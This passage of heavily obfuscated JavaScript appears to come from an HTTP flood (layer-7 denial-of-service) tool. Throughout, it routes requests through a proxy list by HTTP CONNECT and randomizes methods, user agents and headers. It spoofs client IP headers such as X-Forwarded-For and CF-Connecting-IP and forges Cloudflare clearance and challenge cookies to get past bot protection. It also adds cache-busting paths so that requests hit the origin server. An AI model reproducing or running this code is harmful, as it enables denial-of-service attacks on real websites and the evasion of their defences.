Chrome/50.0.2661.75 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:39.0; GTmetrix http://gtmetrix.com/) Gecko/20100101 Firefox/39.0", "Mozilla/5.0 (Linux; Android 4.1.2; Galaxy Nexus Build/JZO54K; GTmetrix http://gtmetrix.com/) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/26.0.1410.58 Mobile Safari/537.22", "Mozilla/5.0 (X11; Linux x86_64; rv:43.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/43.0", "Mozilla/5.0 (X11; Linux x86_64; rv:41.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/41.0"],
  EzQj = (_EzQj = {}, _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_EzQj, "GET", 10), "POST", 8), "HEAD", 5), "PUT", 2), "DELETE", 2), "OPTIONS", 1), "CONNECT", 0.5), "TRACE", 0.5), "PATCH", 0.5), "PURGE", 0.3), _defineProperty(_defineProperty(_EzQj, "LINK", 0.2), "UNLINK", 0.2)),
  gBTj = _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "chrome", _defineProperty(_defineProperty({}, "methods", ["GET", "POST", "HEAD", "PUT", "DELETE"]), "weight", 6)), "firefox", _defineProperty(_defineProperty({}, "methods", ["GET", "POST", "HEAD", "OPTIONS"]), "weight", 3)), "safari", _defineProperty(_defineProperty({}, "methods", ["GET", "POST", "HEAD"]), "weight", 2)), "edge", _defineProperty(_defineProperty({}, "methods", ["GET", "POST", "HEAD", "PUT"]), "weight", 2)),
  gVGk = Object.entries(EzQj).flatMap(function (_ref) {
    var _ref2 = _slicedToArray(_ref, 2),
      ETDk = _ref2[0],
      YOuk = _ref2[1];
    return Array(Math.ceil(YOuk)).fill(ETDk);
  }),
  IWJk = Object.values(gBTj).map(function (AQxk) {
    return AQxk.weight;
  }),
  cSAk = IWJk.reduce(function (ULok, wNrk) {
    return ULok + wNrk;
  }, 0);
function whfl(Yiil) {
  var Ufcl = _defineProperty(_defineProperty({}, "MghAy", function MghAy(obTk, QcWk) {
    return obTk % QcWk;
  }), "ypcXO", function ypcXO(kYMk, MZPk) {
    return kYMk * MZPk;
  });
  try {
    var ozRh = new Uint32Array(1);
    return Ufcl.MghAy(AwCt.getRandomValues(ozRh)[0], Yiil);
  } catch (_unused3) {
    return Math.floor(Ufcl.ypcXO(Math.random(), Yiil));
  }
}
function QAUh() {
  var MxOh = _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "QraKP", function QraKP(IuIh, cqzh) {
      return IuIh(cqzh);
    }), "jlJIZ", function jlJIZ(ErCh, ELpi) {
      return ErCh < ELpi;
    }), "rNQrV", function rNQrV(gNsi, AIji) {
      return gNsi(AIji);
    }), "fYEvj", "weighted"), "rOPzx", "GET"), "AZLUC", "fallback"),
    gtFh = MxOh.QraKP(whfl, 100);
  var cKmi = 0;
  while (cKmi < 65535) {
    switch (cKmi) {
      case 0:
        cKmi = MxOh.jlJIZ(gtFh, 70) ? 1 : 2;
        break;
      case 1:
        cKmi = 65535;
        {
          var wFdi = gVGk[MxOh.rNQrV(whfl, gVGk.length)];
          return _defineProperty(_defineProperty({}, "method", wFdi), "source", MxOh.fYEvj);
        }
        break;
      case 2:
        cKmi = 65535;
        {
          var YGgi = 0;
          var sCXh = MxOh.rNQrV(whfl, cSAk);
          var _iterator = _createForOfIteratorHelper(Object.entries(gBTj)),
            _step;
          try {
            for (_iterator.s(); !(_step = _iterator.n()).done;) {
              var _step$value = _slicedToArray(_step.value, 2),
                UDai = _step$value[0],
                UXNi = _step$value[1];
              YGgi += UXNi.weight;
              var wZQi = 0;
              while (wZQi < 65535) {
                switch (wZQi) {
                  case 0:
                    wZQi = MxOh.jlJIZ(sCXh, YGgi) ? 1 : 65535;
                    break;
                  case 1:
                    wZQi = 65535;
                    {
                      var QUHi = UXNi.methods.filter(function (MRBi) {
                          return EzQj[MRBi];
                        }),
                        sWKi = QUHi[MxOh.rNQrV(whfl, QUHi.length)] || MxOh.rOPzx;
                      return _defineProperty(_defineProperty({}, "method", sWKi), "source", "browser:" + UDai);
                    }
                    break;
                }
              }
            }
          } catch (err) {
            _iterator.e(err);
          } finally {
            _iterator.f();
          }
          return _defineProperty(_defineProperty({}, "method", MxOh.rOPzx), "source", MxOh.AZLUC);
        }
        break;
    }
  }
}
try {
  var _QAUh = QAUh(),
    oTEi = _QAUh.method,
    IOvi = _QAUh.source;
  kERt[":method"] = EzQj.hasOwnProperty(oTEi) ? oTEi : "GET";
  kERt["x-method-source"] = IOvi;
  IOvi.startsWith("browser") && (kERt["user-agent"] = Enzb(IOvi.split(":")[1]));
} catch (kQyi) {
  console.error("Method selection failed:", kQyi);
  kERt[":method"] = "GET";
  kERt["x-method-source"] = "error-fallback";
}
var kkmj = ["(CheckSecurity 2_0)", "(BraveBrowser 5_0)", "(ChromeBrowser 3_0)", "(ChromiumBrowser 4_0)", "(AtakeBrowser 2_0)", "(NasaChecker)", "(CloudFlareIUAM)", "(NginxChecker)", "(AAPanel)", "(AntiLua)", "(FushLua)", "(FBIScan)", "(FirefoxTop)", "(ChinaNet Bot)", "(Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36)", "(Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0)", "(Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36)", "(Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1)", "(Googlebot/2.1; +http://www.google.com/bot.html)", "(Bingbot/2.0; +http://www.bing.com/bingbot.htm)", "(YandexBot/3.0; +http://yandex.com/bots)", "(DuckDuckBot/1.0; +https://duckduckgo.com/duckduckbot)", "(Scrapy/2.4.0; +https://scrapy.org)", "(Wget/1.21.1)", "(curl/7.68.0)", "(Python-requests/2.25.1)", "(Apache-HttpClient/4.5.13)", "(PostmanRuntime/7.28.0)", "(Insomnia/2021.5.2)", "(Java/11.0.10)", "(Go-http-client/1.1)", "(HttpClient/4.5)", "(HTTrack 3.49; Windows)", "(WebScraperBot/1.0; +https://webscraper.io/bot)"],
  Mlpj = ["Mozilla/5.0 ", "Mozilla/6.0 ", "Mozilla/7.0 ", "Mozilla/8.0 ", "Mozilla/9.0 "];
function ghgj(Iijj) {
  var ceaj = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from(_defineProperty({}, "length", Iijj), function () {
    return ceaj[Math.floor(Math.random() * ceaj.length)];
  }).join("");
}
var YaUi = _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "cfHash", function cfHash() {
    return ghgj(43, "abcdef0123456789");
  }), "cfTimestamp", function cfTimestamp() {
    return Math.floor(Date.now() / 1000).toString();
  }), "cfVersion", function cfVersion() {
    return ghgj(1, "123456789") + ".0.0." + (Math.floor(Math.random() * 9) + 1);
  }), "cfSegment", function cfSegment(cCYf) {
    return ghgj(cCYf);
  }),
  AcXi = _defineProperty(_defineProperty(_defineProperty({}, "cf_clearance", ghgj(32, "abcdef0123456789") + "." + YaUi.cfTimestamp() + "-" + (YaUi.cfSegment(8) + "-" + YaUi.cfVersion() + "-") + (YaUi.cfSegment(11) + "_" + (Math.random() > 0.5 ? "vs" : "nv") + "_V.") + (YaUi.cfSegment(21) + "_" + YaUi.cfSegment(47))), "cf_chl_tk", YaUi.cfHash() + "-" + YaUi.cfTimestamp().slice(-10) + "-" + ("" + YaUi.cfVersion() + ghgj(4, "0123456789"))), "cf_chl_rc_md5", ghgj(32, "abcdef0123456789"));
var EDbg = QIik[Math.floor(Math.floor(Math.random() * QIik.length))],
  YySf = onsj[Math.floor(Math.floor(Math.random() * onsj.length))],
  AAVf = kEZj[Math.floor(Math.floor(Math.random() * kEZj.length))],
  UvMf = sKlk[Math.floor(Math.floor(Math.random() * sKlk.length))],
  wxPf = MFck[Math.floor(Math.floor(Math.random() * MFck.length))],
  QsGf = Mlpj[Math.floor(Math.floor(Math.random() * Mlpj.length))],
  suJf = kkmj[Math.floor(Math.floor(Math.random() * kkmj.length))],
  sOwg = oHfk[Math.floor(Math.floor(Math.random() * oHfk.length))],
  UPzg = ICWj[Math.floor(Math.floor(Math.random() * ICWj.length))],
  oLqg = MFUt(ojhn.proxyFile);
var QMtg = Yuzt.parse(ojhn.target);
var NetSocket = function (_IKcw) {
  function NetSocket() {
    _classCallCheck(this, NetSocket);
  }
  return _createClass(NetSocket, [{
    key: _IKcw,
    value: function () {
      var _value = _asyncToGenerator(_regeneratorRuntime().mark(function _callee(gFeg, IGhg) {
        var _kcYg;
        var kcYg, wdcf, Yeff, saWe, UbZe, oXPe, QYSe, kUJe, MVMe, MpAf, orDf, Imuf, koxf;
        return _regeneratorRuntime().wrap(function _callee$(_context) {
          while (1) {
            switch (_context.prev = _context.next) {
              case 0:
                kcYg = (_kcYg = {}, _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_kcYg, "TPAYH", "utf-8"), "dcxKj", "HTTP/1.1 200"), "yHooi", function yHooi(EXOg, gZRg) {
                  return EXOg(gZRg);
                }), "vZKTz", "error: invalid response from proxy server"), "PUEZo", function PUEZo(AUIg, cWLg) {
                  return AUIg(cWLg);
                }), "wimlD", function wimlD(wRCg, YSFg) {
                  return wRCg(YSFg);
                }), "PGiaF", "error: timeout exceeded"), "MnAxD", function MnAxD(Ymth, Aowh) {
                  return Ymth * Aowh;
                }), "yLayy", "connect"), "GZurM", "data"), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_kcYg, "QtNrJ", "timeout"), "RAmXF", "error"), "QmCGj", function QmCGj(Ujnh, wlqh) {
                  return Ujnh !== wlqh;
                }), "nMegd", "object"), "fnyqp", function fnyqp(Qghh, sikh) {
                  return Qghh === sikh;
                }), "lqram", function lqram(Mdbh, ofeh) {
                  return Mdbh !== ofeh;
                }), "DTPch", "function"), "FnlBP", function FnlBP(QEfe, sGie, MBZd) {
                  return QEfe(sGie, MBZd);
                }), "emVoP", "error: invalid arguments"), "FiGyJ", function FiGyJ(oDce, IyTd) {
                  return oDce || IyTd;
                }), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_kcYg, "npNbF", function npNbF(kAWd, EvNd) {
                  return kAWd <= EvNd;
                }), "UfQsn", function UfQsn(gxQd, gRDe, ISGe) {
                  return gxQd(gRDe, ISGe);
                }), "jhNES", "error: missing or invalid options"), "kkNUj", function kkNUj(cOxe, EPAe, YKre) {
                  return cOxe(EPAe, YKre);
                }), "BRtmq", "error: invalid address format"), "gsRGs", function gsRGs(AMue, UHle, wJoe) {
                  return AMue(UHle, wJoe);
                }));
                wdcf = 0;
              case 2:
                if (!(wdcf < 65535)) {
                  _context.next = 12;
                  break;
                }
                _context.t0 = wdcf;
                _context.next = _context.t0 === 0 ? 6 : _context.t0 === 1 ? 8 : 10;
                break;
              case 6:
                wdcf = kcYg.QmCGj(_typeof(gFeg), kcYg.nMegd) || kcYg.fnyqp(gFeg, null) || kcYg.lqram(_typeof(IGhg), kcYg.DTPch) ? 1 : 65535;
                return _context.abrupt("break", 10);
              case 8:
                wdcf = 65535;
                return _context.abrupt("return", kcYg.FnlBP(IGhg, undefined, kcYg.emVoP));
              case 10:
                _context.next = 2;
                break;
              case 12:
                Yeff = gFeg.address;
                saWe = gFeg.host;
                UbZe = gFeg.port;
                oXPe = gFeg.timeout;
                QYSe = 0;
              case 14:
                if (!(QYSe < 65535)) {
                  _context.next = 24;
                  break;
                }
                _context.t1 = QYSe;
                _context.next = _context.t1 === 0 ? 18 : _context.t1 === 1 ? 20 : 22;
                break;
              case 18:
                QYSe = kcYg.FiGyJ(!Yeff, !saWe) || !UbZe || kcYg.npNbF(oXPe, 0) ? 1 : 65535;
                return _context.abrupt("break", 22);
              case 20:
                QYSe = 65535;
                return _context.abrupt("return", kcYg.UfQsn(IGhg, undefined, kcYg.jhNES));
              case 22:
                _context.next = 14;
                break;
              case 24:
                kUJe = Yeff.split(":");
                MVMe = 0;
              case 26:
                if (!(MVMe < 65535)) {
                  _context.next = 36;
                  break;
                }
                _context.t2 = MVMe;
                _context.next = _context.t2 === 0 ? 30 : _context.t2 === 1 ? 32 : 34;
                break;
              case 30:
                MVMe = kcYg.lqram(kUJe.length, 2) ? 1 : 65535;
                return _context.abrupt("break", 34);
              case 32:
                MVMe = 65535;
                return _context.abrupt("return", kcYg.kkNUj(IGhg, undefined, kcYg.BRtmq));
              case 34:
                _context.next = 26;
                break;
              case 36:
                MpAf = kUJe[0];
                orDf = kcYg.gsRGs(parseInt, kUJe[1], 10);
                Imuf = "CONNECT " + Yeff + ":" + orDf + " HTTP/1.1\\r\\nHost: " + Yeff + ":" + orDf + "\\r\\nProxy-Connection: Keep-Alive\\r\\nConnection: Keep-Alive\\r\\n\\r\\n";
                koxf = Buffer.from(Imuf);
                return _context.abrupt("return", new Promise(function (Ejof, glrf) {
                  var cilf = _defineProperty(_defineProperty({}, "hZoLp", function hZoLp(gJpc, AEgc) {
                      return kcYg.wimlD(gJpc, AEgc);
                    }), "lndHO", kcYg.PGiaF),
                    EHmc = AcPs.connect(_defineProperty(_defineProperty({}, "host", saWe), "port", UbZe));
                  EHmc.setTimeout(kcYg.MnAxD(oXPe, 1000));
                  EHmc.setKeepAlive(true, 100000);
                  EHmc.on(kcYg.yLayy, function () {
                    EHmc.write(koxf);
                  });
                  EHmc.on(kcYg.GZurM, function (YCdc) {
                    var UzXb = YCdc.toString(kcYg.TPAYH);
                    !UzXb.includes(kcYg.dcxKj) ? (EHmc.destroy(), kcYg.yHooi(glrf, new Error(kcYg.vZKTz))) : kcYg.PUEZo(Ejof, EHmc);
                  });
                  EHmc.on(kcYg.QtNrJ, function () {
                    EHmc.destroy();
                    cilf.hZoLp(glrf, new Error(cilf.lndHO));
                  });
                  EHmc.on(kcYg.RAmXF, function (wVNc) {
                    EHmc.destroy();
                    kcYg.yHooi(glrf, wVNc);
                  });
                }).then(function (sSHc) {
                  return IGhg(sSHc, undefined);
                }).catch(function (MNyc) {
                  return IGhg(undefined, MNyc.message);
                }));
              case 38:
              case "end":
                return _context.stop();
            }
          }
        }, _callee);
      }));
      function value(_x, _x2) {
        return _value.apply(this, arguments);
      }
      return value;
    }()
  }]);
}("HTTP");
var oPBc = new NetSocket(),
  IKsc = ETL();
Object.assign(kERt, _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, ":method", IKsc.method), ":authority", QMtg.host), ":path", YqEd(QMtg)), ":scheme", "https"));
Object.assign(kERt, (_Object$IKcw2 = {}, _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_Object$IKcw2, "user-agent", IKsc.ua), "uap1", AAVf), "x-forwarded-proto", "https"), "cache-control", gVWoc(IKsc)), "control", UPzg), "accept-language", generateAcceptLanguage()), "lang", wxPf), "accept-encoding", AIzmc()), "encoding", sOwg), "accept", generateAcceptHeader()), _defineProperty(_Object$IKcw2, "accept", UvMf)));
Object.assign(kERt, _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "sec-ch-ua", IKsc.secCHUA), "sec-ch-ua-mobile", IKsc.mobile ? "?1" : "?0"), "sec-ch-ua-platform", IKsc.platform), "sec-fetch-mode", IKsc.navigationMode), "sec-fetch-dest", "document"), "sec-fetch-site", IKsc.siteContext), "sec-fetch-user", "?1"));
var kMvc = QIq();
Object.assign(kERt, _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "x-forwarded-for", kMvc), "forwarded", generateForwardedHeader(kMvc)), "true-client-ip", selectIPFromChain(kMvc)), "x-real-ip", selectIPFromChain(kMvc)), "spoofed", Mhen), "cf-connecting-ip", selectIPFromChain(kMvc)));
Object.assign(kERt, _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "cookie", formatCookies(AcXi) + ("; cf_clearance=" + AcXi.cf_clearance) + ("; __cf_chl_tk=" + AcXi.cf_chl_tk) + ("; __cf_chl_rc_md5=" + AcXi.cf_chl_rc_md5)), "referer", generateContextualReferrer(IKsc)), "referrer-policy", generateReferrerPolicy()), "priority", generatePriorityHint()), "content-security-policy", generateDynamicCSP()), "permissions-policy", generatePermissionsPolicy()));
Object.assign(kERt, _defineProperty(_defineProperty(_defineProperty({}, "server-timing", generateServerTiming()), "via", generateCDNChain()), "x-edge", generateCDNIdentifier()));
Object.assign(kERt, _defineProperty(_defineProperty(_defineProperty({}, "upgrade-insecure-requests", IKsc.upgradeInsecure), "x-http2-stream-id", generateStreamID()), "grpc-timeout", generateGRPCTimeout()));
function kgjd(Mhmd) {
  var Iegd = _defineProperty(_defineProperty({}, "CXZxm", function CXZxm(Ebad, YWQc) {
      return Ebad && YWQc;
    }), "JDOtv", function JDOtv(AYTc, AsHd) {
      return AYTc(AsHd);
    }),
    caXc = new URLSearchParams();
  var _iterator2 = _createForOfIteratorHelper(Mhmd),
    _step2;
  try {
    for (_iterator2.s(); !(_step2 = _iterator2.n()).done;) {
      var _step2$value = _slicedToArray(_step2.value, 2),
        cuKd = _step2$value[0],
        wpBd = _step2$value[1];
      Iegd.CXZxm(cuKd, wpBd) && caXc.set(cuKd, Iegd.JDOtv(encodeURIComponent, wpBd));
    }
  } catch (err) {
    _iterator2.e(err);
  } finally {
    _iterator2.f();
  }
  return caXc.toString();
}
function YqEd(smvd) {
  var ojpd = _defineProperty({}, "dZFQG", function dZFQG(ULw, oHn) {
      return ULw(oHn);
    }),
    Qksd = [smvd.path, ojpd.dZFQG(cKCmc, Qovj), "_=" + Date.now(), "cache=" + Math.random().toString(36).substr(2, 8)],
    sKt = [];
  params && sKt.push.apply(sKt, _toConsumableArray(params));
  return Qksd.join("/") + "?" + ojpd.dZFQG(kgjd, sKt);
}
function QIq() {
  var MFk = _defineProperty({}, "JQgkM", function JQgkM(ICe) {
      return ICe();
    }),
    gBb = Array.from(_defineProperty({}, "length", 3), function () {
      return IWR();
    });
  return [].concat(_toConsumableArray(gBb), [MFk.JQgkM(IWR)]).join(", ");
}
function IWR() {
  return Array.from(_defineProperty({}, "length", 4), function () {
    return Math.floor(Math.random() * 256);
  }).join(".");
}
function ETL() {
  var AQF = _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "qqTJJ", function qqTJJ(wNz, YOC) {
      return wNz / YOC;
    }), "YwUhZ", function YwUhZ(Yiqb, Aktb) {
      return Yiqb % Aktb;
    }), "utIcb", function utIcb(Ufkb, whnb) {
      return Ufkb(whnb);
    }), "BYHNC", function BYHNC(Qceb, sehb) {
      return Qceb(sehb);
    }), "Guqnp", function Guqnp(MZX) {
      return MZX();
    }), "KPOKX", function KPOKX(obbb, ovOb) {
      return obbb > ovOb;
    }),
    cSI = _defineProperty(_defineProperty(_defineProperty({}, "screenRatio", AQF.qqTJJ(window.screen.width, window.screen.height)), "perfMark", AQF.YwUhZ(performance.now(), 1000)), "tzOffset", new Date().getTimezoneOffset());
  return _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "method", AQF.utIcb(QAUh, cSI)), "ua", AQF.BYHNC(Enzb, cSI)), "secCHUA", AQF.Guqnp(MZfpc)), "platform", AQF.BYHNC(QwRb, cSI)), "mobile", AQF.Guqnp(detectMobileContext)), "navigationMode", AQF.Guqnp(calculateNavigationMode)), "siteContext", AQF.Guqnp(generateSiteContext)), "upgradeInsecure", AQF.KPOKX(Math.random(), 0.65));
}
function QwRb(ksIb) {
  var gpCb = _defineProperty(_defineProperty({}, "xUdkc", "desktop"), "UJlfF", "Unknown Platform"),
    IqFb = ksIb.platformType || gpCb.xUdkc,
    cmwb = _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "desktop", "Windows NT 10.0; Win64; x64"), "mobile", "Mobile; " + IKsc.ua), "tablet", "Tablet; " + IKsc.ua), "unknown", gpCb.UJlfF);
  return cmwb[IqFb] || cmwb.unknown;
}
function Enzb(UrRnc) {
  var QoLnc = _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "cBhpm", function cBhpm(onInc, Iiznc) {
      return onInc % Iiznc;
    }), "ccjjh", function ccjjh(kkCnc, kEpoc) {
      return kkCnc + kEpoc;
    }), "fZjDm", function fZjDm(MFsoc, gBjoc) {
      return MFsoc / gBjoc;
    }), "nDRFP", function nDRFP(ICmoc, cydoc) {
      return ICmoc + cydoc;
    }), "mheUB", function mheUB(Ezgoc, YuXnc) {
      return Ezgoc % YuXnc;
    }), "tjVWK", function tjVWK(Awaoc, AQNoc) {
      return Awaoc % AQNoc;
    }), "HbGWy", function HbGWy(cSQoc, wNHoc) {
      return cSQoc(wNHoc);
    }),
    sqOnc = QoLnc.cBhpm(UrRnc.perfMark, 100),
    MlFnc = _defineProperty(_defineProperty(_defineProperty({}, "chrome", "Chrome/" + QoLnc.ccjjh(100, QoLnc.cBhpm(sqOnc, 15)) + ".0." + Math.floor(QoLnc.fZjDm(sqOnc, 15)) + ".0"), "firefox", "Firefox/" + QoLnc.nDRFP(90, QoLnc.mheUB(sqOnc, 30)) + ".0"), "safari", "Version/" + QoLnc.nDRFP(15, QoLnc.tjVWK(sqOnc, 5)) + ".0.3");
  return "Mozilla/5.0 (" + QoLnc.HbGWy(YOKoc, UrRnc) + ") AppleWebKit/537.36 (KHTML, like Gecko) " + MlFnc.chrome + " Safari/537.36";
}
function YOKoc(sKBoc) {
  var oHvoc = _defineProperty(_defineProperty({}, "ecCTY", "Windows"), "NKCli", "10.0"),
    QIyoc = sKBoc.osType || oHvoc.ecCTY,
    Qcmpc = sKBoc.osVersion || oHvoc.NKCli,
    seppc = _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "Windows", "Windows NT " + Qcmpc + "; Win64; x64"), "Mac", "Macintosh; Intel Mac OS X 10_" + Qcmpc), "Linux", "X11; Linux x86_64"), "Android", "Android " + Qcmpc + "; Mobile;");
  return seppc[QIyoc] || "Unknown OS";
}
function MZfpc() {
  var IWZoc = _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "bJCQw", "Chromium"), "Dmfhi", "116"), "LJmvQ", "Not)A;Brand"), "YVLgE", "Google Chrome"), "zeAwk", "121"),
    kYcpc = [_defineProperty(_defineProperty({}, "name", IWZoc.bJCQw), "version", IWZoc.Dmfhi), _defineProperty(_defineProperty({}, "name", IWZoc.LJmvQ), "version", "24"), _defineProperty(_defineProperty({}, "name", IWZoc.YVLgE), "version", IWZoc.zeAwk)];
  return kYcpc.map(function (ETToc) {
    return "\"" + ETToc.name + "\";v=\"" + ETToc.version + "\"";
  }).join(", ");
}
function gVWoc() {
  var kwbmc = _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "IFHwp", "public"), "Ricgc", "private"), "hxhjN", "no-cache"), "yflwC", function yflwC(gtVlc, AoMlc) {
      return gtVlc + AoMlc;
    }), "LBXes", "max-age="), "mXYuz", function mXYuz(cqPlc, wlGlc) {
      return cqPlc * wlGlc;
    }), "SOPvt", "s-maxage="), "nWqzu", function nWqzu(YmJlc, YGwmc) {
      return YmJlc(YGwmc);
    }),
    ErSlc = [kwbmc.IFHwp, kwbmc.Ricgc, kwbmc.hxhjN, kwbmc.yflwC(kwbmc.LBXes, Math.floor(kwbmc.mXYuz(Math.random(), 3600))), kwbmc.yflwC(kwbmc.SOPvt, Math.floor(kwbmc.mXYuz(Math.random(), 86400)))];
  return kwbmc.nWqzu(MRRmc, ErSlc).slice(0, 3).join(", ");
}
function AIzmc() {
  var wFtmc = _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "AhpOS", "gzip"), "UAzfl", "deflate"), "IFvqq", "zstd"), "ViGFX", function ViGFX(sCnmc, Mxemc) {
      return sCnmc + Mxemc;
    }), "IKGDT", function IKGDT(ozhmc, oTUmc) {
      return ozhmc(oTUmc);
    }), "UjTBO", function UjTBO(QUXmc, kQOmc) {
      return QUXmc > kQOmc;
    }), "dFWLJ", ", identity"),
    QAkmc = [wFtmc.AhpOS, wFtmc.UAzfl, "br", wFtmc.IFvqq];
  return wFtmc.ViGFX(wFtmc.IKGDT(MRRmc, QAkmc).join(", "), wFtmc.UjTBO(Math.random(), 0.8) ? wFtmc.dFWLJ : "");
}
function MRRmc(gNImc) {
  return gNImc.sort(function () {
    return Math.random() - 0.5;
  });
}
function cKCmc(ELFmc) {
  var ghwnc = _defineProperty({}, "tgtMI", function tgtMI(ceqnc, wZgnc) {
      return ceqnc % wZgnc;
    }),
    Acnnc = new Uint32Array(1);
  AwCt.getRandomValues(Acnnc);
  return ELFmc[ghwnc.tgtMI(Acnnc[0], ELFmc.length)];
}
function Yaknc() {
  var _UXdnc;
  var UXdnc = (_UXdnc = {}, _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_UXdnc, "kahwm", function kahwm(suZjc, Uvckc) {
      return suZjc < Uvckc;
    }), "wBkJK", "response"), "zylhP", function zylhP(orTjc, QsWjc, koNjc) {
      return orTjc(QsWjc, koNjc);
    }), "PSpjc", "http/1.1"), "GnqBO", "spdy/3.1"), "WhOfQ", "http/1.2"), "wSGcV", "http/2"), "hSQTA", "http/2+quic/43"), "wViFl", "http/2+quic/44"), "eLbdm", function eLbdm(MpQjc, MJDkc) {
      return MpQjc | MJDkc;
    }), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_UXdnc, "PTrSj", function PTrSj(oLGkc, IGxkc) {
      return oLGkc | IGxkc;
    }), "AnqsO", function AnqsO(kIAkc, EDrkc) {
      return kIAkc | EDrkc;
    }), "hhMGu", function hhMGu(gFukc, AAlkc) {
      return gFukc | AAlkc;
    }), "ikimV", function ikimV(cCokc, cWblc) {
      return cCokc | cWblc;
    }), "ilhTL", function ilhTL(EXelc, YSVkc) {
      return EXelc | YSVkc;
    }), "YpftU", function YpftU(AUYkc, UPPkc) {
      return AUYkc | UPPkc;
    }), "MobsV", function MobsV(wRSkc, QMJkc) {
      return wRSkc | QMJkc;
    }), "PGzwF", function PGzwF(sOMkc, siAlc) {
      return sOMkc | siAlc;
    }), "Yopub", function Yopub(UjDlc, ofulc) {
      return UjDlc | ofulc;
    }), "sFiRZ", function sFiRZ(Qgxlc, kcolc) {
      return Qgxlc | kcolc;
    }), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_UXdnc, "LdeAG", function LdeAG(Mdrlc, gZhlc) {
      return Mdrlc | gZhlc;
    }), "uCSWN", function uCSWN(Iallc, kAmic) {
      return Iallc | kAmic;
    }), "LnaRN", function LnaRN(MBpic, gxgic) {
      return MBpic | gxgic;
    }), "weDoV", function weDoV(Iyjic, cuaic) {
      return Iyjic + cuaic;
    }), "dqMec", "prime256v1:X25519"), "KXGfD", "TLS_method"), "ELHAn", "TLSv1_1_method"), "BvEqy", "TLSv1_2_method"), "VIRXE", "TLSv1_3_method"), "NHsaL", "https:"), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty(_UXdnc, "PlDat", "connect"), "mZous", "close"), "JisaO", "error"), "jZVAK", function jZVAK(Evdic, YqUhc) {
      return Evdic(YqUhc);
    }), "mfJyQ", "origin"), "jbNXW", function jbNXW(AsXhc, AMKic) {
      return AsXhc + AMKic;
    }), "bUHel", "https://"), "pcajs", ":authority"), "rIacf", "user-agent"), "rceAr", function rceAr(cONic, wJEic) {
      return cONic + wJEic;
    }), _defineProperty(_defineProperty(_UXdnc, "fGHCv", function fGHCv(YKHic, sGyic) {
      return YKHic + sGyic;
    }), "AfPNU", ":443")),
    wxfkc = UXdnc.jZVAK(UPrq, oLqg),
    Yyikc = wxfkc.split(":");
  kERt[UXdnc.mfJyQ] = UXdnc.jbNXW(UXdnc.bUHel, QMtg.host);
  kERt[UXdnc.pcajs] = QMtg.host;
  kERt[UXdnc.rIacf] = UXdnc.weDoV(UXdnc.rceAr(QsGf, suJf), AAVf);
  var UHBic = _defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "host", Yyikc[0]), "port", ~~Yyikc[1]), "address", UXdnc.fGHCv(QMtg.host, UXdnc.AfPNU)), "timeout", 100);
  oPBc.HTTP(UHBic, function (oDsic, QEvic) {
    var _ciBjc;
    var samjc = _defineProperty(_defineProperty(_defineProperty({}, "qRCen", function qRCen(MVcjc, oXfjc) {
      return UXdnc.kahwm(MVcjc, oXfjc);
    }), "NpZuC", UXdnc.wBkJK), "DSGkB", function DSGkB(kUZic, EPQic, gRTic) {
      return UXdnc.zylhP(kUZic, EPQic, gRTic);
    });
    var ImKjc = 0;
    while (ImKjc < 65535) {
      switch (ImKjc) {
        case 0:
          ImKjc = QEvic ? 1 : 65535;
          break;
